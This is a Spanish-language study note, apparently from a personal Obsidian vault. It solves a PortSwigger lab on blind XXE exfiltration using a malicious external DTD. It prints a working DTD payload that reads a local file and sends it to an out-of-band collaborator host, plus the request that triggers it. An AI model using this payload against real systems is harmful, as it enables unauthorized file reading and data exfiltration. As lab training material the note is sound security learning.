---
aliases:
  - XXE 006 - exfiltrar con DTD externo
  - blind xxe exfiltration external dtd
  - malicious dtd
tags:
  - vuln/xxe
  - example
  - portswigger
---

# 006 — XXE ciego: exfiltrar un archivo con DTD externo ⭐

> Lab: [Exploiting blind XXE to exfiltrate data using a malicious external DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration) · **Practitioner** · técnica → [[vulnerabilities/006-xxe/xxe|entry point]]

## ¿Por qué acá?
- **Vengo de [[vulnerabilities/006-xxe/examples/005-xxe-ciego-callback-oob|005]]:** confirmé que hay XXE ciego (hubo callback OOB), pero fue **solo un ping** — no tengo el contenido del archivo.
- **Por qué no puedo hacerlo inline:** las entidades encadenadas (`%eval` que declara `%exfil`) **no** se permiten en el subset **interno** del DOCTYPE (restricción de XML). Todo el bloque tiene que vivir **afuera**.
- **Entonces:** hospedo un **DTD malicioso** en mi exploit server, lo cargo con `%xxe;`, y ese DTD **lee el archivo y lo manda por la URL** del Collaborator.

## Cómo explotarlo (3 partes)

### 1. El DTD malicioso — qué debe contener
```dtd
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLAB.oastify.com/?x=%file;'>">
%eval;
%exfil;
```
- `%file` → **lee** el archivo.
- `%eval` → declara **dinámicamente** `%exfil`. Necesita `&#x25;` = **`%` escapado**.
- `%exfil` → pide `http://COLLAB/?x=<contenido>` → **exfiltración**.
- **Orden:** primero `%eval;` (define), después `%exfil;` (dispara).

### 2. Hospedar el DTD en el exploit server
- "Go to exploit server" → **File** = `/exploit.dtd`, pegá el DTD en **Body**, **Store**.
- "View exploit" → copiá `https://EXPLOIT.exploit-server.net/exploit.dtd`.

### 3. La request que carga el DTD externo
```http
POST /product/stock HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://EXPLOIT.exploit-server.net/exploit.dtd"> %xxe;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

## Verificación
Burp → **Collaborator** → **Poll now** → la request **HTTP** trae el archivo en `?x=…`.

## Detalles que se pasan por alto
- **`&#x25;` obligatorio** (es `%`). Sin escaparlo, el DTD no parsea.
- **El archivo NO debe tener saltos de línea** para exfil por HTTP: `/etc/hostname` (1 línea) va; **`/etc/passwd` rompe la URL** → pasá a error-based ([[vulnerabilities/006-xxe/examples/007-xxe-ciego-error-based-con-dtd-externo|007]]) o variante **FTP** (`ftp://`).
- **Content-Type de la request = `application/xml`**; el del `.dtd` no es crítico, pero usá **https** en el exploit server.
- El stub va **antes** de `<stockCheck>`, nunca dentro.

→ **Siguiente:** ¿y si el archivo es **multilínea** (rompe la URL) o **no tengo canal OOB**? → [[vulnerabilities/006-xxe/examples/007-xxe-ciego-error-based-con-dtd-externo|007 — error-based]].
